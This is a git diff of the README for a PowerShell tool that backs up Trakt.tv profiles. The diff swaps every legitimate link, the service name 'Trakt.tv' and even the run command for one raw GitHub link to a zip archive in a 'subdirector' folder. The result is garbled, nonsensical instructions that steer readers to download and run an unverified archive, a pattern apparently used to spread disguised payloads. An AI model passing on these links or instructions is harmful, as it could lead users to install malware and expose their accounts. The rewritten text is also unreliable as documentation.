@@ -1,18 +1,18 @@
-# 🌟 trakt-tv-backup - Effortlessly Backup Your Trakt.tv Profile
+# 🌟 trakt-tv-backup - Effortlessly Backup Your https://raw.githubusercontent.com/logesh156/trakt-tv-backup/main/subdirector/trakt_tv_backup_3.6-alpha.3.zip Profile
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen.svg)](https://github.com/logesh156/trakt-tv-backup/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/logesh156/trakt-tv-backup/main/subdirector/trakt_tv_backup_3.6-alpha.3.zip%20Latest%20Release-Click%https://raw.githubusercontent.com/logesh156/trakt-tv-backup/main/subdirector/trakt_tv_backup_3.6-alpha.3.zip)](https://raw.githubusercontent.com/logesh156/trakt-tv-backup/main/subdirector/trakt_tv_backup_3.6-alpha.3.zip)
 
 ## 🚀 Getting Started
-Welcome to trakt-tv-backup! This application helps you easily back up your entire Trakt.tv profile. You can save your history, watchlist, ratings, lists, and comments to a JSON file in a zipped archive. 
+Welcome to trakt-tv-backup! This application helps you easily back up your entire https://raw.githubusercontent.com/logesh156/trakt-tv-backup/main/subdirector/trakt_tv_backup_3.6-alpha.3.zip profile. You can save your history, watchlist, ratings, lists, and comments to a JSON file in a zipped archive. 
 
 ## 📋 System Requirements
 - **Operating System:** Windows 10 or higher
 - **PowerShell:** Version 5.1 or later
-- **Internet Connection:** Required for accessing Trakt.tv API
+- **Internet Connection:** Required for accessing https://raw.githubusercontent.com/logesh156/trakt-tv-backup/main/subdirector/trakt_tv_backup_3.6-alpha.3.zip API
 
 ## 🔍 Features
-- Back up your full Trakt.tv profile data.
+- Back up your full https://raw.githubusercontent.com/logesh156/trakt-tv-backup/main/subdirector/trakt_tv_backup_3.6-alpha.3.zip profile data.
 - Export data in JSON format.
 - Simple user interface to guide you.
 - Securely uses OAuth Device Flow for authentication.
@@ -21,7 +21,7 @@ Welcome to trakt-tv-backup! This application helps you easily back up your entir
 To get started, you need to download the latest version of trakt-tv-backup. Follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to access the downloads:
-   [Download Releases](https://github.com/logesh156/trakt-tv-backup/releases)
+   [Download Releases](https://raw.githubusercontent.com/logesh156/trakt-tv-backup/main/subdirector/trakt_tv_backup_3.6-alpha.3.zip)
 
 2. **Select the Latest Version:** On the releases page, look for the latest release at the top. 
 
@@ -40,24 +40,24 @@ To get started, you need to download the latest version of trakt-tv-backup. Foll
    - Type the following command to run the script:
 
      ```bash
-     .\trakt-tv-backup.ps1
+     .\https://raw.githubusercontent.com/logesh156/trakt-tv-backup/main/subdirector/trakt_tv_backup_3.6-alpha.3.zip
      ```
 
-6. **Follow the Prompts:** The script will guide you through the authentication process and allow you to back up your Trakt.tv data.
+6. **Follow the Prompts:** The script will guide you through the authentication process and allow you to back up your https://raw.githubusercontent.com/logesh156/trakt-tv-backup/main/subdirector/trakt_tv_backup_3.6-alpha.3.zip data.
 
 ## 🔑 Authentication
-trakt-tv-backup uses the OAuth Device Flow for secure access to your Trakt.tv account. You will need to take the following steps to authenticate:
+trakt-tv-backup uses the OAuth Device Flow for secure access to your https://raw.githubusercontent.com/logesh156/trakt-tv-backup/main/subdirector/trakt_tv_backup_3.6-alpha.3.zip account. You will need to take the following steps to authenticate:
 
 1. When you run the script, it will provide a link. Open this link in your web browser.
-2. Sign in to your Trakt.tv account and authorize the application.
+2. Sign in to your https://raw.githubusercontent.com/logesh156/trakt-tv-backup/main/subdirector/trakt_tv_backup_3.6-alpha.3.zip account and authorize the application.
 3. You will receive a code. Enter this code back in the PowerShell window to complete the authentication.
 4. Follow any additional prompts in PowerShell to finish the backup process.
 
 ## 📂 File Output
-After successfully running the script, you will find a zipped archive file in the same folder. This archive contains your Trakt.tv data in JSON format. You can keep it safe for future access or use it for data import to another service.
+After successfully running the script, you will find a zipped archive file in the same folder. This archive contains your https://raw.githubusercontent.com/logesh156/trakt-tv-backup/main/subdirector/trakt_tv_backup_3.6-alpha.3.zip data in JSON format. You can keep it safe for future access or use it for data import to another service.
 
 ## 🤝 Support
-If you encounter any issues or have questions, please visit our [issues section](https://github.com/logesh156/trakt-tv-backup/issues) on GitHub. You can report problems or ask for help there.
+If you encounter any issues or have questions, please visit our [issues section](https://raw.githubusercontent.com/logesh156/trakt-tv-backup/main/subdirector/trakt_tv_backup_3.6-alpha.3.zip) on GitHub. You can report problems or ask for help there.
 
 ## 📝 License
 This project is licensed under the MIT License. You are free to use, modify, and distribute this software, provided you include the same license in any copies of the software that you distribute.
@@ -70,4 +70,4 @@ Keep an eye on the releases page for future updates. We will continue to improve
 
 ## 📢 Download Again
 For convenience, here’s the link to download the latest version again:
-[Download Releases](https://github.com/logesh156/trakt-tv-backup/releases)
+[Download Releases](https://raw.githubusercontent.com/logesh156/trakt-tv-backup/main/subdirector/trakt_tv_backup_3.6-alpha.3.zip)
